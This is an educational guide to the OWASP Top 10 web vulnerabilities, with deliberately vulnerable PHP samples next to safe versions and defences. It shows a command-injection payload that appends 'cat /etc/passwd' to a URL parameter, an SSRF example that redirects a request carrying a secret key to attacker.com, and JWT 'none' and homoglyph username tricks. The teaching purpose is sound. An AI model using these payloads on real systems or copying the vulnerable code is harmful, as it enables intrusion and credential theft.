```yml
```
## 1. Broken Access Control

### What is it?
Access control enforces rules about what pages or data a user is allowed to see. **Broken Access Control** happens when these rules are not properly implemented, allowing users to access resources they shouldn't.

**Real-World Analogy:** Imagine a hotel where every guest's room key (your login session) can open every other guest's room, including the manager's office. That's broken access control.

### Impact
*   **Viewing Sensitive Information:** Seeing other users' personal data, emails, financial records.
*   **Unauthorized Functionality:** Performing actions like changing other users' passwords, modifying data, or accessing admin panels.

### Insecure Direct Object Reference (IDOR)
This is a common type of Broken Access Control vulnerability.

*   **Safe Code (The Right Way):** The server uses the logged-in user's ID from their secure session to fetch their data.
    ```php
    // Get the user ID from the session (controlled by the server)
    $user_id = $_SESSION['user_id'];
    // Fetch only that user's profile
    $profile = $db->getUserProfile($user_id);
    ```
*   **Vulnerable Code (IDOR):** The server uses a user-supplied parameter (like in the URL) to fetch data without checking permissions.
    ```php
    // Get the user ID directly from the URL (controlled by the user!)
    $user_id = $_GET['id'];
    // This will fetch ANY user's profile if the ID is changed
    $profile = $db->getUserProfile($user_id);
    ```

#### Example Scenario: The Bank Website
1.  You log into your bank account. The URL is `https://bank.com/account?id=111111`.
2.  You notice the `id` parameter. You change it to `id=222222` and press enter.
3.  The page reloads, and you now see the account details and transaction history of another user.
4.  **Why?** The server trusted the `id` from the URL instead of using your logged-in session to determine whose account to show.

---

## 2. Cryptographic Failures

### What is it?
This vulnerability involves the **misuse or absence of cryptography** to protect sensitive data. It was previously called "Sensitive Data Exposure," focusing on the cause rather than the symptom.

There are two key times to protect data:
*   **In Transit:** While being sent between the client and server (e.g., using HTTPS).
*   **At Rest:** While stored on a server (e.g., in a database, using encryption).

### Scenario: The Exposed Database File
A small website stores all its user data in a flat-file database (like an SQLite file) for simplicity. By mistake, this database file is stored in a public web directory.

*   An attacker discovers the file at `https://example.com/app.db`.
*   They download it and can now open and query it locally, gaining access to all user data, including weakly hashed passwords.

#### How to Query an SQLite Database (Example)
```bash
# 1. Check the file type
file app.db
# Output: app.db: SQLite 3.x database

# 2. Open the database with the sqlite3 client
sqlite3 app.db

# 3. List the tables inside the database
sqlite> .tables
users

# 4. View the structure of the 'users' table
sqlite> PRAGMA table_info(users);
0|userID|INT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|creditCard|TEXT|0||0

# 5. Dump all the data from the table
sqlite> SELECT * FROM users;
1|alice|5f4dcc3b5aa765d61d8327deb882cf99|1234-5678-9012-3456
2|bob|e10adc3949ba59abbe56e057f20f883e|9876-5432-1098-7654
```
**Note:** The passwords here are hashed with MD5, which is cryptographically broken and easy to crack.

---

## 3. Injection

### What is it?
Injection flaws occur when **untrusted user input is processed as code or a command** by the application. The application "injects" this input into a interpreter (like a database or operating system shell), leading to unintended execution.

### Types of Injection
*   **SQL Injection (SQLi):** User input alters SQL database queries.
*   **Command Injection:** User input is passed to the server's operating system shell.

### Command Injection Example
A website uses the Linux `cowsay` command to generate fun messages.

**Vulnerable PHP Code:**
```php
<?php
if (isset($_GET["mooing"])) {
    $mooing = $_GET["mooing"];
    $cow = $_GET["cow"];
    // User input is directly concatenated into the command!
    passthru("perl /usr/bin/cowsay -f $cow $mooing");
}
?>
```
A normal request: `https://cowsay.com?mooing=Hello&cow=default`
This runs: `perl /usr/bin/cowsay -f default Hello`

**The Attack:**
An attacker can use a command separator like `;` or `&&` to break out of the intended command and run their own.
`https://cowsay.com?mooing=Hello; cat /etc/passwd&cow=default`
This runs: `perl /usr/bin/cowsay -f default Hello; cat /etc/passwd`
The server will execute both the `cowsay` command and then `cat /etc/passwd`, revealing sensitive system information.

### Defenses
*   **Allow Lists:** Only allow pre-approved, safe input (e.g., only letters and numbers).
*   **Stripping Input:** Remove dangerous characters (like `;`, `&`, `|`) before processing.

---

## 4. Insecure Design

### What is it?
This category focuses on flaws that are **inherent to the application's architecture or design**, not mistakes in the code itself. It's about missing security controls at the blueprint stage.

### Example: Insecure Password Reset
**The Flawed Design:** A password reset function generates a 6-digit numeric code sent via SMS. To prevent brute-forcing, the system limits attempts to **250 guesses per IP address**.

**The Attack:**
1.  An attacker understands the design flaw: the limit is per IP, not per account.
2.  They use a botnet (thousands of different computers with different IP addresses).
3.  Each IP makes 250 guesses against the same victim's account.
4.  With a 6-digit code (1,000,000 possibilities), 4,000 IPs (4,000 * 250 = 1,000,000) can theoretically try every possible code quickly.
5.  The design assumed no single user could control thousands of IPs, but this assumption was wrong.

**The Fix:** A secure design would limit attempts **per account** (e.g., 10 failed attempts locks the account) and use longer, alphanumeric codes.

---

## 5. Security Misconfiguration

### What is it?
This occurs when security settings are **not defined, implemented, or maintained properly**. Even secure software can be vulnerable if configured incorrectly.

### Examples:
*   **Exposed Cloud Storage:** An Amazon S3 bucket containing sensitive data is set to "public" instead of "private."
*   **Enabled Default Accounts:** Leaving default admin usernames and passwords (admin/admin) active.
*   **Unnecessary Features:** Running unused services or opening ports that aren't needed.

### Scenario: The Exposed Debug Interface
Frameworks like Flask (Python) often include a debug mode to help developers. This mode provides an interactive console for troubleshooting. This interface should **never** be enabled on a production server.

*   **The Mistake:** A developer pushes code to the live website but forgets to disable the debug mode.
*   **The Attack:** An attacker finds the debug console at `https://example.com/console`.
*   **The Impact:** The console allows execution of arbitrary Python code on the server, giving the attacker full control. This is exactly how Patreon was hacked in 2015.

---

## 6. Vulnerable and Outdated Components

### What is it?
Using third-party components (like libraries, frameworks, and modules) that have known security vulnerabilities. If your application depends on a vulnerable library, your entire application becomes vulnerable.

### Real-World Scenario:
1.  A company's website is built on WordPress.
2.  They haven't updated it in three years. A scan shows it's running WordPress version 4.6.
3.  An attacker searches and finds that WordPress 4.6 has a public exploit for **Remote Code Execution (RCE)**.
4.  The attacker uses the exploit to take control of the website and its server.

**Key Lesson:** You are responsible for every component you use, even if you didn't write it. Maintain a software inventory and patch regularly.

---

## 7. Identification and Authentication Failures

### What is it?
These are flaws in the login and session management functions of an application. Essentially, problems with proving who you are (authentication) and keeping you logged in (session management).

### Common Flaws:
*   **Brute Force Attacks:** No limits on login attempts.
*   **Weak Credentials:** Allowing simple passwords like "password123".
*   **Weak Session Cookies:** Using predictable session tokens.

### Interesting Attack: Username Squatting
**Scenario:** An application has a user named `admin`. You want to impersonate them.

**The Trick:**
1.  Try to register a new account with a username that looks identical but has a slight variation, like ` admin` (with a space at the beginning) or `admın` (using a Unicode character that looks like 'i').
2.  If the application's registration logic doesn't normalize usernames (e.g., trim spaces), it will create a new account.
3.  In some poorly designed systems, this new account might be granted the same privileges as the original `admin` account because the application's authorization check is also flawed.

---

## 8. Software and Data Integrity Failures

### What is it?
This vulnerability occurs when an application uses software or data **without verifying its integrity**—meaning, it can't tell if the software or data has been tampered with.

### A) Software Integrity Failures: The Compressed Library
**Scenario:** Your website uses a JavaScript library from a public CDN (Content Delivery Network), like jQuery.
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```
**The Risk:** If an attacker hacks the CDN and changes the `jquery-3.6.1.min.js` file to include malicious code, every visitor to your site will automatically download and run the malicious code.

**The Solution: Subresource Integrity (SRI)**
You can add a "hash" (a cryptographic fingerprint) of the correct library file. The browser will check the downloaded file against this hash. If they don't match, it won't execute the file.
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"
        integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
        crossorigin="anonymous"></script>
```

### B) Data Integrity Failures: Tamper-Proof Cookies with JWT
Web applications use cookies to keep users logged in. A naive approach would be to store the username in a plain cookie: `Cookie: username=admin`. A user could easily change this to `username=elitehacker` and impersonate someone else!

**The Solution: JSON Web Tokens (JWT)**
JWTs are a secure way to represent user data. They have three parts (Header.Payload.Signature), all base64-encoded.

*   **Header:** `{"alg":"HS256","typ":"JWT"}` -> `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`
*   **Payload:** `{"username":"guest","exp":1665076836}` -> `eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ`
*   **Signature:** A cryptographic signature created using the header, payload, and a **secret key only the server knows**.

The final token looks like: `header.payload.signature`

If a user tries to change the payload from `guest` to `admin`, the signature will no longer be valid. The server will detect the tampering because it can't generate the matching signature without the secret key.

**The "None" Algorithm Vulnerability:**
Some old JWT libraries had a critical flaw. They allowed attackers to set the signing algorithm in the header to `none`. This meant the token had no signature for verification. An attacker could change the payload to `"username":"admin"` and simply remove the signature, and the vulnerable server would accept it as valid.

---

## 9. Security Logging and Monitoring Failures

### What is it?
This is the lack of ability to **detect and respond to security breaches**. If you aren't logging key events, you can't know if an attack happened, what they did, or how to stop them.

### Why is it Critical?
*   **Without Logs:** An attacker could breach your system, steal data, and leave without a trace. You might only find out from a third party or when the data is leaked online.
*   **With Proper Logging:** You can see the attack as it happens, trigger alarms, and respond immediately to minimize damage.

### What Should Be Logged?
*   **HTTP Status Codes** (e.g., 404 Not Found, 200 OK, 500 Server Error)
*   **Timestamps**
*   **Source IP Addresses**
*   **Usernames** involved in the action
*   **URLs/Actions** performed (e.g., `POST /login`, `GET /admin/delete_user?id=123`)

### Example of Suspicious Activity to Monitor:
*   **Brute-Force Attacks:** 100 failed login attempts from a single IP in one minute.
*   **Scanning:** Many `404 Not Found` errors as an attacker probes for hidden files.
*   **Access to Sensitive Areas:** A non-admin user requesting the `/admin` panel.

---

## 10. Server-Side Request Forgery (SSRF)

### What is it?
An SSRF flaw allows an attacker to **trick the server into making unauthorized requests to other internal or external systems**. The server becomes an unwilling proxy for the attacker.

### Basic Scenario: The SMS API
A web app uses an external API to send SMS messages. The API call requires a secret key.
```
Normal Flow:
User -> Your App -> SMS Provider API (with Secret Key)
```

**Vulnerable Code:**
The app lets the user specify the SMS provider's server in a parameter.
```php
$server = $_GET['server']; // e.g., "smsprovider.com"
$api_key = "SECRET_KEY_123";
// The app makes a request to the user-supplied 'server'
file_get_contents("https://" . $server . "/api/send?key=" . $api_key . "&msg=Hello");
```
A normal request: `https://yourapp.com/sms?server=smsprovider.com`

**The SSRF Attack:**
An attacker changes the `server` parameter to their own server.
`https://yourapp.com/sms?server=attacker.com`
This causes your application to make a request to:
`https://attacker.com/api/send?key=SECRET_KEY_123&msg=Hello`

The attacker now has your secret API key and can send SMS messages on your dime!

### Advanced SSRF Impacts
*   **Internal Network Scanning:** Attackers can make the server scan its own internal network, mapping out systems that are not directly accessible from the internet (e.g., `http://192.168.1.50:8080`).
*   **Accessing Cloud Metadata:** In cloud environments (like AWS), attackers can force the server to query its own metadata API, often yielding powerful credentials.